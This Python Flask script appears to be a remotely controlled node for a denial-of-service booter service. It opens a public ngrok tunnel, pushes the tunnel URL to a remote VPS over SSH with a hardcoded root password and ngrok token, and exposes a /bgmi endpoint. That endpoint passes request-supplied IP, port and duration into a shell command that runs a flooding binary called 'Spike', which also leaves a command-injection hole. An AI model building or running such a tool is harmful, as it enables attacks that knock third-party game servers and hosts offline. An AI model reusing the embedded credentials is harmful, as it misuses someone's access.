import os
import subprocess
import threading
import logging
from flask import Flask, request, jsonify, send_from_directory
from pyngrok import ngrok
import paramiko
import time

# Set up logging
logging.basicConfig(
    filename='app.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
)

active_processes = {}

def install_packages():
    required_packages = ['Flask', 'pyngrok', 'paramiko']
    for package in required_packages:
        try:
            subprocess.check_call([f'{os.sys.executable}', '-m', 'pip', 'show', package])
            logging.info(f"Package '{package}' is already installed.")
        except subprocess.CalledProcessError:
            try:
                subprocess.check_call([f'{os.sys.executable}', '-m', 'pip', 'install', package])
                logging.info(f"Package '{package}' installed successfully.")
            except subprocess.CalledProcessError:
                logging.error(f"Failed to install package '{package}'.")

def configure_ngrok():
    ngrok_token = "2pGcsrT3vF5TX6Mr4fSZuk25RN3_3RvA1N4ytzSADJXfU718u"
    try:
        ngrok.set_auth_token(ngrok_token)
        logging.info("Ngrok token configured successfully.")
    except Exception as e:
        logging.error(f"Failed to configure ngrok: {str(e)}")

def update_soul_txt(public_url):
    try:
        with open("binder1.txt", "w") as file:
            file.write(public_url)
        logging.info("Updated binder1.txt with new ngrok link.")
    except Exception as e:
        logging.error(f"Failed to update binder1.txt: {str(e)}")

def update_vps_soul_txt(public_url):
    vps_ip = "157.173.113.94"
    vps_user = "root"
    vps_password = "0522Ziyawakeel"

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps_ip, username=vps_user, password=vps_password)
        sftp = ssh.open_sftp()
        with sftp.open("binder1.txt", "w") as file:
            file.write(public_url)
        sftp.close()
        ssh.close()
        logging.info("Updated binder1.txt on VPS successfully.")
    except Exception as e:
        logging.error(f"Failed to update binder1.txt on VPS: {str(e)}")

def execute_command_async(command, duration):
    def run(command_id):
        try:
            process = subprocess.Popen(command, shell=True)
            active_processes[command_id] = process.pid
            logging.info(f"Command '{command}' started with PID: {process.pid}")

            time.sleep(duration)

            if process.pid in active_processes.values():
                process.terminate()
                process.wait()
                del active_processes[command_id]
                logging.info(f"Process {process.pid} terminated after {duration} seconds.")
        except Exception as e:
            logging.error(f"Error executing command '{command}': {str(e)}")

    command_id = f"cmd_{len(active_processes) + 1}"
    thread = threading.Thread(target=run, args=(command_id,))
    thread.start()
    return {"status": "Command execution started", "duration": duration}

def run_flask_app():
    app = Flask(__name__)

    @app.route('/favicon.ico')
    def favicon():
        return send_from_directory(os.path.join(app.root_path, 'static'), 'favicon.ico', mimetype='image/vnd.microsoft.icon')

    try:
        public_url_obj = ngrok.connect(5002)
        public_url = public_url_obj.public_url
        logging.info(f"Ngrok public URL: {public_url}")

        update_soul_txt(public_url)
        update_vps_soul_txt(public_url)
    except KeyboardInterrupt:
        logging.warning("Ngrok process interrupted by user.")
    except Exception as e:
        logging.error(f"Failed to start ngrok: {str(e)}")

    @app.route('/bgmi', methods=['GET'])
    def bgmi():
        ip = request.args.get('ip')
        port = request.args.get('port')
        duration = request.args.get('time')

        if not ip or not port or not duration:
            logging.warning("Missing parameters for /bgmi request.")
            return jsonify({'error': 'Missing parameters'}), 400

        command = f"./Spike {ip} {port} {duration} 1024 400"
        logging.info(f"Received command: {command}")
        response = execute_command_async(command, int(duration))
        return jsonify(response)

    logging.info("Starting Flask server...")
    app.run(host='0.0.0.0', port=5002)

if __name__ == "__main__":
    logging.info("Script started.")
    install_packages()
    configure_ngrok()
    try:
        run_flask_app()
    except Exception as e:
        logging.error(f"Unexpected error: {str(e)}")
